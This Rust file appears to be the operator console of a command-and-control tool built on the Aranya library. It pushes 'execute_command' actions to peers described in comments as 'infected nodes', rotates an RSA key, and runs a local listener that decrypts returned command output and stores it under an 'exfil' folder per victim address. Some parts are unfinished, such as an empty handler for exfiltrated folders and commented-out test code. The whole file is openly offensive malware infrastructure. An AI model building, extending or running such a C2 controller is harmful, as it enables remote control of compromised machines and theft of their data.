mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    io::{Write, Read},
    net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
    path::{Path, PathBuf},
    fs::{self, OpenOptions},
    str::FromStr,
    sync::Arc,
    time::Duration
};

use aranya_crypto::{CmdId, DeviceId, EncryptionKey, EncryptionPublicKey, IdentityKey, IdentityVerifyingKey, Rng, afc::{UniChannel, UniOpenKey, UniSealKey, UniSecrets}, default::{DefaultCipherSuite, DefaultEngine}, id::Id, policy::LabelId};
use aranya_fast_channels::{AranyaState, Directed, shm::{Flag, Mode, ReadState, WriteState}};
use aranya_policy_ifgen::Actionable;
use aranya_policy_vm::{Text, text};
use aranya_runtime::{Sink, VmEffect, vm_action};
use clap::Parser;
use rsa::{Oaep, RsaPrivateKey, sha2::Sha256, traits::PublicKeyParts};
use tokio::sync::Mutex;

use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client}, common::{C2Client, FastChannelMessage, PrivateKeyBundle}, policy::update_rsa_key};

struct OperatorSink;

#[derive(Parser)]
struct CommandArguments {
    #[arg(long)]
    new_graph: bool,

    // TODO: Is this even possible ?
    // #[arg(long)]
    // list_commands: bool,

    #[arg(long)]
    start_afc: bool,

    #[arg(long)]
    new_rsa: bool,

    #[arg(long)]
    config_dir: String,

    #[arg(long)]
    command: Option<String>,

    #[arg(help = "Peer Addresses e.g. 127.0.0.1:4445")]
    args: Vec<String>
}

impl Sink<VmEffect> for OperatorSink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, _effect: VmEffect) {
        // NOTE: No operation
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

const MAX_MESSAGE_SIZE: usize = 1024 * 1024 * 1024;

fn parse_fast_channel_message(
    msg: &FastChannelMessage,
    addr: IpAddr,
    dir: &Path
) {
    match msg {
        FastChannelMessage::CommandExecuted { data } => {
            let dir = dir.join("exfil").join("command");
            fs::create_dir_all(&dir);
            let mut file = OpenOptions::new()
                .append(true)
                .create(true)
                .open(dir.join(addr.to_string()))
                .expect("Couldn't open cmd file");

            file.write_all(&data);
        },
        FastChannelMessage::FoldersExfiltrated { folders } => {

        }
    }
}

async fn afc_listener(
    dir: PathBuf,
    key: RsaPrivateKey
) {
    let listener = TcpListener::bind("127.0.0.1:4446").unwrap();
    println!("Listening now");

    let mut buffer = vec![0; MAX_MESSAGE_SIZE];
    for stream in listener.incoming() {
        let mut stream = stream.unwrap();
        let addr = stream.peer_addr().unwrap().ip();

        let Ok(n) = stream.read(&mut buffer) else {
            continue;
        };

        let Ok(v) = key.decrypt(
            Oaep::new::<Sha256>(),
            &buffer[..n]
        ) else {
            continue;
        };

        if let Ok(data) = postcard::from_bytes::<FastChannelMessage>(&v) {
            parse_fast_channel_message(&data, addr, &dir);
        }
    }
}

#[tokio::main]
async fn main() {
    // Enable logging to terminal
    tracing_subscriber::fmt::init();

    let args = CommandArguments::parse();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    // let rt = tokio::runtime::Builder::new_multi_thread()
    //     .thread_stack_size(100 * 1024 * 1024)
    //     .enable_all()
    //     .build()
    //     .unwrap();

    let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 3)), 4445);

    let dir = Path::new(&args.config_dir);

    let _ = fs::create_dir(&dir);
    let mut sink = OperatorSink;
    let mut aranya = C2Client::new(dir);
    
    let keys = match args.new_graph {
        true => {
            aranya.new_engine();
            aranya.create_new_keys()
        },
        false => {
            aranya.load_keys()
        }
    };

    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let mut clientstate = aranya.init_aranya(policy);

    if args.new_graph {
        let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
            Ok(v) => v,
            Err(_) => return
        };

        // TODO: Temporary debug code for infected nodes to quickly
        //   connect up to the same graph ID
        fs::write("src/graph.txt", graph.as_array());
    }

    if let Some(command) = args.command {
        let txt = Text::from_str(&command).unwrap();
        clientstate.action(
            aranya.get_graph(),
            &mut sink,
            vm_action!(execute_command(txt))
        );
    }

    if args.new_rsa {
        let mut rng = Rng;
        let key = RsaPrivateKey::new(&mut rng, 2048)
            .expect("Failed to generate RSA private key");
        aranya.save_rsa_key(&key);

        let pubkey = key.to_public_key();

        println!("{:?}", pubkey);

        update_rsa_key(pubkey.n().to_bytes_be(), pubkey.e().to_bytes_be()).with_action(|action| {
            clientstate.action(
                aranya.get_graph(),
                &mut sink,
                action
            )
        });
    }

    if args.start_afc {
        tokio::spawn(afc_listener(dir.to_path_buf(), aranya.load_rsa_key()));
    }

    let quic = {
        let mut syncbind = bind.clone();
        syncbind.set_port(4446);
        Arc::new(new_quic_client(syncbind))
    };

    let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));

    for ipstr in args.args {
        let socket: SocketAddr = ipstr.parse()
            .expect("Invalid IP format");

        c2push(
            socket,
            Arc::clone(&quic),
            Arc::clone(&syncer),
            aranya.get_graph()
        ).await;
    }


    // TODO: This sleep is very important becasue without it, the
    //   program will end and the data won't be transferred to
    //   some of the peers, if any at all.
    // tokio::time::sleep(Duration::from_millis(1000)).await;

    // TODO: For now, sleep forever, for the server loop
    tokio::time::sleep(Duration::from_millis(100000000)).await;

    // let graph = aranya.create_graph(&dir, &mut cs, &mut sink, &keys);

    // let mut file = std::fs::File::create(dir.join(Path::new("config.yaml"))).expect("Cannot open file");
    // let mut contents = String::new();
    // file.read_to_string(&mut contents);

    // let s = serde_yaml::from_str::<std::collections::BTreeMap<String, String>>(&contents).expect("YAML deserialisation failure");
    // println!("{:?}", s.get("hi"));

    // println!("{:?}", graph);

    // rt.block_on(async move {
    //     // if args.new_graph {
    //     //     let graph = match aranya.create_graph().await {
    //     //         Ok(v) => v,
    //     //         Err(_) => {
    //     //             print!("Failed to create Aranya graph...");
    //     //             return;
    //     //         }
    //     //     };

    //     //     let mut file = std::fs::File::create("src/graph.txt").unwrap();
    //     //     file.write_all(graph.as_array()).expect("Failed to write to debug graph.txt");
    //     // }

    //     let quica = {
    //         let mut syncbind = bind.clone();
    //         syncbind.set_port(4446);
    //         Arc::new(new_quic_client(syncbind))
    //     };

    //     // TODO: Insane testing environemnt skills
    //     // TODO: End skills

    //     // TODO: AFC Test

    //     // tokio::spawn(async {
    //     //     afc_listener().await;
    //     // });

    //     // TODO: End AFC Test
    // });
}
